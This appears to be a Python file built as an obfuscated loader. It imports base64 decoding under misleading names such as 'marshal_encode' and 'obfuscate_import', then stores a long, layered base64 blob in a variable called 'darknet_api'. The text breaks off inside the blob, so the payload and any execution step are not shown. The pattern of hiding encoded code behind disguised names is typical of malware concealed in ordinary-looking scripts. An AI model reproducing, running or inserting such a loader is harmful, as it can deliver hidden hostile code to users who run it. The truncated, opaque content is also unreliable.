from base64 import b64decode as marshal_encode;from base64 import b64decode as zlib_compress;from base64 import b64decode as obfuscate_import;darknet_api = "V1ZaamVHUXlTWHBUYWtKS1UwVndjMWt4YUZkaVIwMTZWVzV3UkdKV2NEVlpha2wzV2pGc2RWUlVRa3BTTW5nd1dUQmpOV1ZYVWtSUmEwNWhWakJaZUZwRlpITmlWMUpZWlVaU2FVMHhXak5STWpGelpFZE9TRTlZYkd0Uk1Fb3lXVE5zTkdWV2NGUmxSRUpvVm5wR2MxUkZhRTlPVjA0MVpVaHNXbFo2Vm5KWmFrbDNVekpHV0UxWVpHbE5NRzkzVTFWb1UySXlUblJXYldoaFVqSjRNVmR1WkhaVE1rbDZWRmhXYWsweWVEWmFSV1JYWkVWMFJGTnRjR2xTTVZwdldUSnNTbU5GVG01alIyeGFWbnBXTVZkc2FFcGFNVUpVVVZkc1NtRlZiRXhYUldodVpVWnNjMk16WkZCbGF6RXpWRE53VW1WdFNsUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1IyVkVVazVXTUhCcFZGVmpkMW93YkVKalIwNXNVa1ZhY0ZZemNFSk9NREUyVVZSa1QxSkZOVEJUVlZvMFRrVXhXRk50U2s1V1NFNDJWRmR3ZWsxRk1VaE5SMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtXVk5IWkRSWFYzaDZaVVU1TmxSWWJGQmxiRVkwV1d4YWVsb3hWa1JSYTJ4S1VsVXhibFJHVGtOVWEyeEdVbGRrVkdWVlNrdFRWVlpLV2pGU05WRnNWa3BTYm1jd1ZGWmtTMWxyTVZWak0zQk9ZVzVOZDFSVlkzZGFNR3hFVVZka1NsRXdSbTVUVlU1RFdUSldSVkp0YkZobGEwVXpWRmh3UWs0d05VVlVibEpLVVZoQ2FscFZVa2RoVm1RMlVWUmtUbVZyUlROVWExSlBaRVZzUjJWRVVrNVdNSEJwVkZWamQxb3diRVJSVjJSS1VUQkdibE5WVGtOWk1sWkZVbTFzV0dWclJUTlVXSEJLVGpBMVJWRnVVbGhOUmxrd1dUQm9TMkpIVFhwVVdGSlNUVEJ2TVZrd2FGTmthMnhIVkcxd2FtSlhlRE5hUlU1RFZqQXhjMDFYVG14U1JWcHdWak53UTJSRmJFUlJWMlJLVVRCR2JsTlZUa05aTWxaRlVtMXNXR1ZyUlROVVdIQkNUakExUlZSdVVrcFJXRUpxV2xWU1IyRldaRFpSVkdST1pXdEZNMVJyVWs5a1JXeEhaVVJTVGxZd2NHbFVXSEI2WldzeFZXTjZRazVTZWtKdVUxVk9RbG93YkVSUlYyUktVbXhLZGxsV2FFNWFNazE1Vkc1c2FGZEZTWGRUVldSelpXdHNTRTVZV210Uk1FcDBXV3BPU2xveVRYbFNiazVoVlRCV2JsTlZUa0phTUd4RVVWZGtXVk5IWkRSWFYzaDZaREE1TmxSWVpGQmxiRVkyV1d4T1FsTXhhRWxhTTJoYVlraE9NMVF6Y0U1a01EazJWVmh3YVZVd1NtcGFWVkpIWVZaa05sRnVVa3BSTUVadVUxVk9RbG93YkVSUlYyUktVbTVuTUZSV1pFdFphekZGWXpOd1RtRnVUWGRVYWtsM1dqQnNSazFYYUdGTmJsSnZXVlpvVDJGRmJFaE9WelZhVjBkNE1sbHRNV3BhTVVwV1ZHeEtTbEV3U21wYVZWSkhZVlprTmxGdVVrcFJNRVp1VTFWT1Fsb3diRVJSVjJSWlUwZGtORmRYZUhwa01EazJWRmhrVUdWc1JqWlpiRTVDVXpGb1NWb3phRnBpU0U0elZETndUbVF3T1RaVldIQnBWVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFNibWN3VkZaa1MxbHJNVWhOUjJSRVlWVnNjRk5YWkhaVE1YQjBUMWhzU2xJd05YWlhWbWhLV2pKR1dFNUhaRnBpVlZveFdXMHhWMlZWT1c1aU1IQnFUVEo0TmxSSE5VOU5SbkJJVDFSR2ExRjZWWHBaTWpGelRVWndWR0ZIY0doU01GbzFVekZHZGxOdFRYcGlTSEJOWW1zMGQxZHJZelZOVjFKRVRsY3hhVk5HV2paWlZVNXVZMFZPYm1KRVFtaFdla1p6VkVjMVQyTXhjRmhXYm1STVVrVkdNVlJWVWtaalJVNXVZMFJHYWsxc1dqVlhSRXB6WVRCc1JVMUhaR2hXZWxZeldrWm9VbUl3YkhObFJGSk9WakJ3YVZSVlVucGxhelUyWTNwQ1RtSlVRbTVWYkdodlpESk9kRlp1Y0dwTlJUVTFXbFpvUTAxSFNqVlJhM0JUVVRCS2FscFZVa2RoVm1RMlVXNVNTbEpIT1c1VFYyeHlVekpSZVZKdWJHbGlWM1J1VlVaT1FtRlZiSEJUYlU1c1VrVmFjRll6Y0VKT01ERTJVMVJrVDFKRlNqQlJNbmhMWWtacmVVOVlVbWxXTVZveFYydGtWMkV3YkVsVmJUbHFZbFphYjFkclRrTmpSMDQxVVZob1NsSXhTWGhYYkU1RFRVZEtOVkZxUW1oU01WWnVWMVJKTldSWFNuUldiWEJyVWpKM2VWbFdhRk5PVld4SVpVaGFhazB3TVV4V2EyUnZZa1ZzU0UxWVdtcGlWbFp1V2tWa2IyVldjRmhTYlhSS1UwZDRNbHBHVGtOaU1XeFpWMjE0U2xOR1NuWlhiRTVEWkVkSmVsTnRlRXBUUmxveFdYcE9VMkZHYkhSbFIzaEtVakozZDFOVlpITmxhMnhFVGtka1RXRlZSakZSTW5nMFRrVXhXRk50U2s1U2VrSndVMWRzU2xNeGNIUlBXR3hLVWpBMWRsZFdhRXBhTWtaWVRrZGthMDFyV2pWWmJURnlUbXRPYm1KSWNHeFhSVEV4V1hwT1UyRXlTWHBXYWtKTlltMVNOVmxXYUZOaVJYUklWRzA1V2xkRmJIZFJNbVJ6WlcxV1dWUllWbXBOTVVweVdXcE9WMDFGZUhSWGJrNXJWMFUxZGxNd1RuSlRNRTVaVlc1Q2FWWXhWakZaZWtvMFlrWndXVkZYT1U1UmVsSXpWRlpPY2xNd1RuVldibkJoVjBWd2JWcEZaRzlsVm5CWVVtMTBTbEpFUW01WlZtTXhaREpTV1ZWWE9VcGhNbWd5V2toc1EyUkdiRmhPVkZaS1VteEtkbGt5TVZkaFJuQkVVVlJhU2xFd2JIZFJNalZyWVVkT2RFNVlRbWxpVjA1dVZVWk9RbUZWYkhCVFZYUldZbFphY1ZscVNYaGtSbkJZVGxkMFlWWXhSbTVVVmsxM1pXdHNTR0ZJV210WFJYQTJVMVZhTkU1Rk1WaFRiVXBPVmtoT05sUlhjSHBOUlRGWVRWZEtVbUpWV2pGVFZXUnpaV3RzU0ZKdGNHdFNNbmQ1VjJ4T1IxcEdhRWxhTTJoYVlraE9NMWxzUm5kVGEyeEhaVVJTVGxZd2NHbFVWbEo2WldzeGNXTjZRazVXZWtZMVYyeGplR1J0VW5SV2JVNXNVa1ZhY0ZZemNFTmtSV3hKVlcwNVlWVXdTWGRaVm1ONFlrZE9jRkZ1Y0dsbFZVbDNXVlZrUjAxRmJFbGlTRnByVlRCS2NWZFdZekJhTWtwWVVtNVdXbFl5VW5OVFZXaHpaRzFTV1ZOWFpHbE5NbEl4VTFWb1UyTkhTbGhXVjJoRVlrWktkbGRzVGtOaVYwbDZVMnBDYTFaNlZuTlRWV00xWWxWc1NXSklXbXRYUld4dVYxWmtUMkZ0U1hwV2JsWnJVVE5rYmxsV2FFNWFNa2w1VGtka2JGWjZhM2haTW14RFdUSldSVkp0YkZobGExVXpWRmh3U2s0d05VVlNibEpvVWpCYU1WZHJXalJPUlRGWVUyMUtUbEo2UWpGVFZVMHdXakI0Y0ZGVmRGQmhNVVpNVTFkc1NtRlZUbTVqUnpGcFRUQnNibGRVU205aFIwNXdVVzVDYVdGVlNYcFhWbWhMWkZkR1dFNVhOVkJhTWpsTFdYcE9jMlZyZUhWVWFrSmhVbnByZUZwRlRURk5NazUwWWtSQ1lWVXlhSEZaVldSSFpWVjBVbUl3Y0dwTk1uZzJWRWMxVDAxR2NFaFBWRVpyVVhwV2RGbHJhRmRsYlVaRVdqTkNSRm95ZDNkWlZtTjRZa1Y0ZFZSdVRtRldNVm96VXpCU1FtUlZNVVZTV0VKRVdqTkNNMWt5TVhOa1YxSkVXakpzV1ZKNlZsVmFSV1JIWlZkU1JGRnJVbWxTTUZwM1dXeGtjMlJXY0RWTlIyUk5WVEJHTUZOVlRYZGFNSGhVVVZoU1NsRjZRbTVVUms1Q1pFVnNjR0V3ZEVSaVZrcHpWMjFzUTJKc2NGbFZiVnByVmpCV2RsTXhVblpUTUU1WlZtNXdZVmRGY0cxWFZtUnJZa2RLZFZWdFdtbFNNbmcyV2tWT1FrOVZiRWRqTUhSS1VUQkdibE5VUWs5aU1rNTBUMWhTWVZWWE9XNVRWVTVDV2pCdmQwMVlXbXhpVjNoNldXdGtSbVJyTlZST1NHUktVVEpvV1ZsV1l6RmhNa2w2V2tod1NsSlVWbFpUVlZKR1pEQjRjVkZVWkVwU2JWSjNXVzF3V2sxRk9UVlJhbEpQWVd4R2QxTlZWa2RrTWs1SVpVZDRWMDFzV25CVmVrcHpUVVY0TmxaWWNFOWxWRkkyVkcxc1FtSXhUWGRoUmxaVlZsaGtlbE5WWkRSalIwVjVWbGRrVTAxc1duRlpWRWswWTBWc1JsUnRPV3BpVkd3d1YyeE5ORTFyTVVST1NHUk5ZV3N4TkZSV1VrcGtWVEZWVWxod1NsSnJOVzlYYlRGSFpWZEdWRTlFUms1bGJVNHhWRmh3V21KcmVFSmlNbVJLVVRCR2JsTnFRWGhrYlZaMFlraE9hVkl3VmpKVWJFMHdaREJzUkdGR2FHaFdlbFp5V1dwT2EyVnJiRVpPVmxaS1VrWnNNVlJXVW5wYU1WbDVZa2hXVDJGc1JUTlRWV2h1VFdzMVJHRXlaRkpYUlVveldXdGtWMWRHY0ZoVGEzaG9WMFpHTWxSc1VrNU5NSGh4VkZSS1NsRXlhRTFWTUZwVFZHeFNSR1F5WkdsU01uaDVWMnhPUTFOR2NGaFVia3BwWlZkMGJsVlVTbTlsVjBsNVRWZDRUV1ZzYkROVVIzQkNaRlV4TmxKWWFFNWhWRkV4VkZWT1ExWkdiRmhYYldocVlsZDBNbFJzVWs1Tk1IaHhWRlJLUzJWWVpFeFRWVTVDV2pCc1JGcEZOV2xOTTBKM1dXdGtOR0ZGZURaV1dGWk9VVEJHZGxacVNuTmtWbkJJVDFST2FtVlZTbEJXYTA1Q1RWVjRjVkpVWkVwU2JWSjNXVzF3V2sxRk9UVlJhbEpQWVd4R2QxTlZWa2RrTWs1SVpVZDRWMDFzV25CVmVrcHpUVVY0TmxaWWNFOWxWRkkyVkcxc1FtSXhUWGRoUmxaVlZsaGtlbE5WWkRSalIwVjVWbGRrVTAxc1duRlpWRWswWTBWc1JsUnRPV3BpVkd3d1YyeE5ORTFyTVVST1NHUk5ZV3N4TkZSV1VrcGtWVGxWVVZka1ZrMXJXblJYVm1oTFkwVjRObFpZY0U5bFZGSTJWRzFzYW1Nd1RuQlJWMlJLVVRCR2RWWkdZelZPYlVaWVpVaE9XbFY2WjNoVVIzQkNXakIwUjFwSVFtbGlWa295V2tST1Rsb3hVbk5WVjJSUFlWUlNOVlF6YkVOWFIwWllUa1JLVDFKSVRtNWFWVkphVFVWMFZGRnJTbXBUUlVwNlYyeGFhMkpHYkhKa1NFSnJVWHBuZUZSWWNHcGtWVEUyVjFka1RGSllVa3BXYTFWNFZGVjRSRkZ1VG1oV00xSnpVMVZXYTJKR2EzbGtTRnBNVlRCS1JWbFZhRXRrYlVwWVZsaGFUMkZyUmpGVVZVMHdaV3N4VlZKWWJFMWhiWFF6VTFWYVQyRkdjSFJTYm14b1ZYcG5lRlJZY0dwa1ZURTJWMWMxVFZGWE9XNVRWVTVDV2pCdmQwMVlXbXhpVjNoNldXdGtSbVJyTlZST1NHUktVVEpvV2xSV1VrWk9NR3hHWlVoQ2FXSnNXVEJUVldodVRrVTFjMDlFU2s5Uk1uUnVWVlpvUTJReVNraFdiR2hoVmpCd1RWbFdhRkprYXpWVlZGUk9UV0ZyTUhsVFZVNXZWRVpPUjFWck5WVlJNMlJ1V1d0a2MyTnNjRlJSYTJoaFZqQTFlVmx1YkhKYU1VVjVZVWhzYVUxcVJuTlVTSEJTVFVWNGNWRllWazVoYkVZelZGaHJNR1ZGTlZWWk1tUldUV3RhZEZkV2FFdGpSWGcyVmxod1QyVlVValpVYld4cVl6Qk9jRkZYWkVwUk1FWjFWa1pqTlU1dFJsaGxTRTVhVlhwbmVGUkhjRUphTUhSSFdraENhV0pXU2pKYVJFNU9XakZTYzFWWFpFOWhWRkkyVkROc1ExZEhSbGhPUkVwUFVraE9ibHBWVWxwTlJYUlVVV3RLYWxORlNucFhiRnByWWtac2NtUklRbXRSZW1kNFZGaHdhbVJWTVRaWFYyUk1VbGhTU2xaclZYaFVWWGhFVVc1T2FGWXpVbk5UVlZacllrWnJlV1JJV2t4Vk1FcEZXVlZvUzJSdFNsaFdXRnBQWVd0R01WUlZUVEJsYXpGVlVsaHNUV0ZyVmpSVVdHeERWa1pzV0ZkdGFHcGlWM1F5Vkd4U1RrMHdlSEZVVkVwTFpWaGtURk5WVGtKYU1HeEVXa1UxYVUwelFuZFphMlEwWVVWNE5sWllWazVSTUVaMlZtcEtjMlJXY0VoUFZFNXFaVlZLVUZaclRrSmxSVEZFVGtoa1VHVlZTbGxaVm1Nd1RXczFSV015Wkd4U1JtdDNVekZPUTFGdFRrbFJiazVoVm0xU2MxZFhkREJqUjFKRVQwUkdUbVZ0VGpGVVdIQmFXakIwUm1SRmJGZFNWRVpPVkVWT1EyTXlSbGhrUjNoS1VsZFNjMWRVU2pCa2EzUlVVV3RTYUZORmNESlpiR1JXWkdzMVZWa3pWazVSZWxJMVZERlNiazB3ZUhGU1dIQk9aVlZLVlZkV1pHRmhSMDUwWVROYVQxWkZNSHBVUjNCT1RXdHdOV1F3ZEVwUk1FWnVVMVZPYTFSdFNYcGpTRUpwVWpOb2IxUkljRlprVlRGRVVWYzVWMDF0ZURGWGEyTTFUVEpPTlZGck9WZFJNRVY1VkVkd1JrNHdiRWRhU0VKcFlXeHJkMVF6YkVOT1JUVnhWVmhDU2xKVldqTlpNR1EwWWtaWmVWWnRiRlJOYlhkM1ZFaHdWbVZyTlRWT1NIQlBZVlZHZGxWNlFtOVdWbEpXWkROT1NsSXphSGRaVkVwV1dqRkplVlp0Y0doTmFtaDNVMVZXVDJJeVRuUlBXRkpoVlhwbmVGUnVhekJrTUhoeFUxUldVRkpIVGpGVVZsSk9aV3RzUjFSdGFHRmlWVm8xV1ZaTk5FMVZNVFpaTTFaT1pXeHNkVlJGUm5aYU1HeEVVVmRrUzAxRVJqSmFWekZ6WXpKS1NGSllXazlWZWxJelUxVk9iMWRIUmxoT1YzUnBUVEpTTmxOVlZURldWV3hGVWxoa1RXRnJSVE5UVlZwclkwZEtjVmRVUWxCbFZVa3dWRzF3VW1ORmJFWlNibVJxVWpOb2MxWnFTbGRoVmsxNVlrUkNUV1ZzVmpaVWJtc3daV3MxY0ZGWE9WUk5SMmhXVmtaV00yTXdiRWhsU0VKb1RXeFdibFZxU2xkaGJVVjVUMGhDU2xKVk5YWlpNakExWkVad1ZFOUVSazlWZWxJelZFZHdTazVGT1VWVVdGWlFVa2RPYmxaVVNrZGlWbXhaVTI1Q1RXVnNWalpVYm1zd1pXczFjRmt6VGtSaFZVWnVVMVZPUW1Kc1VsaFBWRnBvVmpOb2VsZFdUVFJOVlhoeFVWZGtURkp0VW5kWmJURlRaRzFSZWxSWFpGVmlSa1p1Vkcxck1HVkZPVFZSYkdob1ZucFJlVlJyVW5wYU1sWkZWMVJDVEZVd1NrTlpNR2hEWXpGd1YxcEhlRnBoTTFKM1drVk5ORTFWTVRaWk0xWk9aV3hzYmxNd1ZqQlRWbHBHVFZVeFRWRXdTbnBaVm1Rd1lrVnNSbHBIZUZwTmJsSXlVekZPUTFKSFJrbFRibHBwVmpGV01sUnNVbFprVlRGRVRraHNVRkpIWkRaVVIzQnVUVEJzUjFSdGFHRmlWVm8xV1ZaTk5FMVZNVFpaTTFaT1pXeHNkVlJGUm5aYU1HeEVVVmRrU2sxR2NIZFpNakZYWWxkSmVsb3dkRXBSTUVadVUxVk9hMVJ0U1hwalNFSnBVak5vYjFSSWNGSmtWVEZFVVZjNVdrMXFiREJaTUdSSFRVZEdXRk51VG1GV1NFNXVWa1phVDFOc1NsUlJWRlpOWVd0Rk0xTlZXbXRqUjBwMFZXNWFhMDB3TVc1V1IzaFNXakExY0U1SWFFeFZNazU2VVRKc1Fsb3diRVJSVnpWVlZucHJNbGxXWkRSak1XeFVUMFJHVFdGclJtNVRNRnByWTBkS2RGVnVXbXROTURGdVZrZDRVbG93TlhCT1NHaFFaVlZLV1ZaRVJtcE5helZGWXpKa1YxTkZjSGRYYTJSWFpGZFNSRTlFVGsxaGEwVXpVMVZvUzAxck9YRlNXR2hOWVd0R2QxTlZaRFJqUjBWNVZsZGtVMDFzV25GWlZFazBZbXQ0UW1JeVpFcFJNRVp1VTJwQmVHUnRWblJpU0U1cFVqQldNbFJzVFRCa01HeEVZVWR3YVUxcVJqTlhWbWhUWTBac2RHVkhlRkJsVlVwUFZsUkNjMUpyYkVWaE0xWk9Va2hPYmxacVNuTmtWbkJJVDFST2FtVlZTbEJXYTA1Q1RXdDRjVkpVWkVwU2JWSlJWbTV3V2sxRk9UVlJiRlpxWWxkNGNsZHNZekZOUlhnMlZsaFdUbEV5ZEhWVVJVWjJXakJzUkZGWFpFdE5SRVl5V2xjeGMyTXlTa2hTV0ZwUFZYcFNNMU5WVG05WFIwWllUbGQwYVUweVVqWlRWVlV4VmxWc1JWZFlWazVXU0U1dVZtdG9TMk5HY0VoV2JsWnJVWHBuZWxSSGNFSk9NR3hKVTJwS1VHRnJWalJVUjNCQ1kwVnNTR1ZJUW1oTmJGWnVWV3BLVjJGdFJYbFBSelZOVVZjNWJsTlZUa0phTUc5M1RWaGFiR0pYZUhwWmEyUkdaR3MxVkU1SVpFcFJNbWhaV1Zaak1XRXlTWHBhU0hCS1VsUldWbE5WVWxwa1ZURnhZekprVjAxRWJGbFViWEJTVGpCc1IxVnViR2hXTVVweldXMDFVbVJyTlRWT1NHUlFaVlZLTlZwSGNIWmxSVEZVVGtoa1RGVXdTbnBaVm1Rd1lrVnNSbHBIZUZwTmJsSXlVMjVzTTFNd2JFUlJWMlJLVVRKU1QxbHFUbmRqUjBwSVpVZG9UV1ZzVmpGVVZVNUNZakZaZVdKSVZtRlNlbXQ2V1ROc1ExUXhXa1JSV0doT1VYcFNNMVF6YkVOWFJsRjRXWHBLVDFKSVRtNVdhMmhMWTBad1NGWnVWbXRSZW1kNlZFZHdRazR3YkVsVGFrcFFZV3RXTkZSSGNFSmpSV3hJWlVoQ2FFMXNWbTVWYWtwWFlXMUZlVTlITlUxUlZ6bHVVMVZPUWxvd2IzZE5XRnBzWWxkNGVsbHJaRVprYXpWVVRraGtTbEV5YUhGWmFrbDRaREZzV1ZWdVFscGlXR2h6VkROc1ExUnNWWGRpUlZwS1VrZDBNVlJWVW5wYU1WbDVZa2hXWVZKNmEzcFpNMnhEVkRGYVJGRlVTazFoYTBVelUxVmFVMlZYUmxoVmJYaHBZbXhHTWxSc1RUQmtNSFJVV1ROT1JHRlZSbTVUVlU1Q1lteFNXRTlVV21oV00yaDZWMVpOTkUxVmVIRlJWMlJNVW0xU2QxbHRNVk5rYlZGNlZGZGtWV0pHUm01VWJXc3daV3M1TlZGc2FGVk5WMDE1Vkd0U2Vsb3hXa2xUYmtKaFVqRmFNVnBGVFRSTk1IaHhVVlJrU2xORmIzbFVNbkJHWlVWNGNWRllRa3BTTTJoM1dWUktWbG94U1hsV2JYQm9UV3BvZFZSRlJuWmFNR3hFVVZka1MwMUVSakphVnpGell6SktTRkpZV2s5VmVsSXpVMVZPYjJGdFNYbE5XR1JhVjBaS2QxZFhNVFJpUlRrMVVXczFWazFIZUVkVFZWSnlaRlV4UldNeVpGZE5iWGd4VjJ0ak5VMHlUalZSYXpsWFVUQkZlVlJIY0VaT01HeEhWVzVzYUZZeFNuTlpiVFZTWkdzMVZFNUlaRXhWTWs1NlVUSnNRbG93YkVSUlZ6VlZWbnByTWxsV1pEUmpNV3hVVDBSR1RXRnJSbTVUTUZwclkwZEtkRlZ1V210Tk1ERnVWa2Q0VWxvd05YQk9TR2hRWlZWS1dWbFdZekJOYXpWRll6SmtiRkpHYTNkVU0yeERWbGRPZEdKSGRHRldlbFYzVkVod2FtUlZNVVZqTW1ScVlteHJNbFJXVWtaa1ZURkVZVEprYVZJeWVIbFhiRTVEVTBad1dGUnVTbWxsVjA1NlVUSnNRbG93YkVSUlZ6VlZWbnByTWxsV1pEUmpNV3hVVDBSR1RXRnJSbTVUTUdSUFpHMUtXVkZ0YUd0U01uaHdXV3RrVms0d2JFWk5WbEpVVmxaV2JsUldVa0prVlRGRll6SmtWMDF0ZURGWGEyTTFUVEpPTlZGck9WZFJNRVY1VkVkd1JrNHdiRWRhUmtKWFpXeHJkMVF6YkVOV1YwNTBZa2QwWVZaNlZYZFVTSEJhWkZVeFJHRXlOVTFSVnpsdVUxVk9RbG93YjNkTldGcHNZbGQ0ZWxsclpFWmthelZVVGtoa1NsRXlhSEZaYWtsNFpERnNXVlZ1UWxwaVdHaHpWRE5zUTFSc1ZYZGlSVnBLVWtWV00xUkhjRUpPTUd4SFdraENhV0pXU2pKYVJFNU9XakZTYzFWWFpFOWhWRkkwVkROc1ExWlhUblJpUjNSaFZucFZkMVJJY0Zwa1ZURkVZVEkxVFZGWE9XNVRWVTVDV2pCdmQwMVlXbXhpVjNoNldXdGtSbVJyTlVST1NHUktVVEpvY1ZscVNYaGtNV3haVlc1Q1dtSllhSE5VTTJ4RFZHeFZkMkpGV2twU1IyUXhWRlZTZWxveFdYbGlTRlpoVW5wcmVsa3piRU5VTVZwRVVWUkdUV0ZyVlROVFZWcFRaVmRHV0ZWdGVHbGliRVl5Vkd0Tk1HUXdPVFZSV0ZaVllURmFWbE5WVms5VVZsWndVVmhzVFdGclJqRlViRkpDVFRBeGNWbDZaRXBSZWxaUVZXeGFVbG94UlhkbFJrNUtVa1V4TVZSVlRUQk5SVFZWVVZSS1RXRnJiRFJVYkZKS1RqQnNSRTVWT1ZOV2JFWnVWVlJDTkZVd2JFVlVXRlpQVlhwU05sUlZVbXBsVlRsVVlUSTFXVlZYT1V0WGJUQTFaVlZzU0dFeVpHaFdlbEp1V1RJeFIyUldiM2xXVnpsT1ZUTmplVk14VW5aVE1FNVNZa1JHYWsxc1dqVlhSRXBIWW14d1dFNVVRa3BTUkVKdVdUSXhSMlJXY0VoUFdGSk5ZbFUxZGxscVNuTmhiSEJVWVVSR2FrMXNXalZYUkVwSFlteHdXRTVVUWxsTmJtaDNXWHBPVW1ORlRtNWlTR3hoVjBaSmVGa3lNREJhTWxKWlZHMTRhbUpFYkc5WGFrcFhaRmRTUW1Jd2RHRlNNVnAwVTFWa2EySkhVa2RQVkVKcFRXNVNjMWx0Ykc5a01XeFlXa2Q0VFZKNmJETmFSV1J6WkcxS2NHVkhjR2xOYlhneFV6RlNkbE13VGxoVmJscGhUV3hhTTFkV2FGTk5SbkJaVTI1V2FtVlZSVFZUVlZwNllWWm9SRk5yVmxWTlIxSkhWbXRqTldOc2NGaE9WMDVLWVZoa2JsZEZUa3RaYkd4VVRWUmFVbFY2Um1oVVZVMTNUbFpvVkdSSFRrcGhWV3g2VTFkNE0yRldTa1pQVldoVFYwWktNbGxVU2xka1YwMTVWbTF3YTFkRmNHcFRWMnd6V2pGb1JGTnRTbHBWZWtVeVZWWk5lRmxWTVVSTlJGWlpWVE5TYWxOWGJFdGFSVTV1WWtkc1drMXFWak5YVm1oVFRVWndXVk51Vm1wbFZVVTFVMVZhZW1GV2FFUlRhMDVTVFVSV1ZsbHFTakJpUjBwelpESnNUVkV3U21wVFYzZ3dZVVY0V1dORlNrMVdiVGt6VkVaU2MxcEZjM2hrTW14S1lWaGtjRmRGVGt0Uk1VVjNUbFJDYVUxdVVuTlpiVFZQWWtacmVsWnViRmxSTUd4NlUxVmFNMkZXWTNsU1dGSnNZVEJXTUZZeWNFSmtSVGxYVFVoS1dWRXdiSEJYUmtaMlUyMVNTVk5xVW1wU01GbDNXa1ZrVjJWWFNuVlVWMlJSVlRCS2FWTlhlRE5oVmxwSFUyeHNWMUo2YkhsWGJHTXhXVEJzY0dReVpGbFJNSEJwVjFaTmVFNXNSbFJOVjBaT1VYcEJNVmRHVGpCWk1HeHdVMWhPU21KSVpIQldhMXBMVjFkU1NFOVlTbUZXZWxZMlYyeGtUMDFYVG5Oa01teE5VVEJLYWxOWGVEQmhSWGhaWTBWS1RWWnRPVE5VUmxKeldrVnplR1F5YkVwaVJFSk1VVEZrVTJGSFRYbGhTR1JhVjBaSmQxZHNhRXRrVjA0MVVWUnNTbEp1VG5CWFJVNUxVbFpHVjFScmJGZFNlbXg1VjJ4ak1Wa3diSEJrTW1SWlVUQndhVmRXVFhoT2JFWlVUVmRHVGxGNlFURlhSazR3V1RCc2NGTllUa3BpU0dSd1ZXdFdSMVpHVGtsVmJscG9UV3hhTVZsNlNsZGhiVkpaVTIxT1NtRllaRzVYUlU1TFdXeHNWRTFVV2xKVmVrWm9WRlZOZDA1V2FGUmtSMDVLWVZWd2ExRXlaSE5oVm10NVlVaGtXbGRHU1hkWGJHaExaRmRPTlZGVWJFcFNiazV3VjBWT1MxRXhSWGRoUmxacFRXNVNjMWx0ZUROaFZYaEVVVzFPU21KSVVtOVVSbWgzVVd0NFYySXpaRTFXUjNoclUzcEdNMkZWYkhCa01teFpVVEJ3UkZWVVFtOU5SMGw1WkVkNGFXSnJOWE5YVkU1WFpWWm9SRk5ZVGtwU2JtUndWbnBLUm1SSFZuSlNXRkpZWVd0R01GUXhXWGRqYkdoRVUxZHNXVlZYT1V0WmEyaFRZVzFPU0ZKcVFtdFNNVm8xV1cwMVRsb3hRbFJSYlVwS1lraGtjRlpGV2xOU1JscElUMWhLWVZaNlZtcFRWMnd6V2pGb1JGTnRTbHBWZWtVeVZWWk5lRmxWTVVSTlJGWlpWVE5TYWxOWGJFcGpNR3h6WkRKc1ZWSnNTa1ZhUldNMVkyeHdXRTVZY0dGV01EUjRXVEo0TTJGVmVFUlJiVTVLWWtoU2IxUkdhSGRSYTNoWFlqTmtUVlpIZUd0VGVrWXpZVlZzYzAxRmRFUlhSMUp2V2tjeFYyVnRUa2hTYWtKclVqRmFOVmx0TlU1YU1VSlVVVzFLU21KSVpIQldha0pIVmpGS1YxUnNWbWxOYmxKeldXMTRNMkZWZUVSUmJVNUtZa2hTYjFSR2FIZFJhM2hYWWpOa1RWWkhlR3RUZWtZellWVnNjR1F5YkZsUk1IQlpWVlphWVZKc1ZYcFZibHBvVFd4YU1WbDZTbGRoYlZKWlUyMU9TbUZZWkc1WFJVNUxXV3hzVkUxVVdsSlZla1pvVkZWTmQwNVdhRlJrUjA1S1lWVndhMUV5WkhaVGJVWllWMWRrV2sxcWJIZFpiV3hDVDFaQ1ZGRlhiRk5TVkd4SlZXeE9TazVyVG01aE1IQm9WakZzYmxscVRrTk5SMFpZVDFoV1NsSkVRVFZUVlU1S1pEQnNjV0l3ZEVSVlYzUkxXa1ZqTldOc2NGaE9SMlJSVlRCS05scEZhRXBpTWs1MFZsaFdZV0pYZURGWGEyUkhZekpLUkdGSGRHbE5iVkp6V1RCa1IwMUhVa2hXYm14cFltczFhVlJWV1hkak1rNUlVbTAxWVZVeWRIZFJNbVJ5VTJ0T1dHTkVSbWxpV0ZJMlUxVlJkMW94WkRWVGJVcEtZVmhrY0ZkR1RrcGpNR3h6WkRKc1NtRllaSEJUYm14TFdrVk9ibUV3Y0VSV01YQXlXVEpzUTJOWFVsaE9XRXBLVWpKNE1WTlZaSGROVjBwMFpFaHdVRm95T1V0Uk1VWnlVMjFTU0U5WVNtRldlbEp1VlVaT1EwMUhTWGxrUjNocFlWUldOVmRzYUVOak1XeFlWRzE0VEZJelFYaFpiVEY2WXpCc2NGTllRa1JhTW5STFVURm9VMlJ0UlhsV2JsWktVa1JDYmxsNlRsTmxWWFJKVlc1YWFFMXNXakZVUnpWUFpESktTR0pFUWt4Uk1HeDZVMWRzYzFsck1WZE5TRUpOWW1zMGQxa3lNWE5rTUhSRVlUQjBSRlZYZEV0Wk1qRlhUVWRTV1ZOdVZrcFRSa295V1ZSS1YyUlZUbTVoTUhCb1ZqRnNibGxxVGtOTlIwWllUMWhXU2xKRVFUVlRWVTVLWlVWc2NXSXdkRVJWVjNSTFdrVmpOV05zY0ZoT1IyUlJWVEJLTmxwRmFFcGlNazUwVmxoV1lXSlhlREZYYTJSSFl6SktSR0ZIZEdsTmJWSnpXVEJrUjAxSFVraFdibXhwWW1zMWFWUldXWGRqTWs1SVVtMDFZVlV5ZEhkUk1tUnlVMnRPV0dORVJtbGlXRkkyVTFWUmQxb3haRFZUYlVwS1lWaGtjRmRHVGtwak1HeHpaREpzU21GWVpIQlRibXhMV2tWT2JtRXdjRVJXTVhBeVdUSnNRMk5YVWxoT1dFcEtVako0TVZOVlpIZE5WMHAwWkVod1VGb3lPVXRSTVVaeVUyMVNTRTlZU21GV2VsSnVWVVpPUTAxSFNYbGtSM2hwWVZSV05WZHNhRU5qTVd4WVZHMTRURkl6UVhoWmJURjZZekJzY0ZOWVFrUmFNblJMVVRG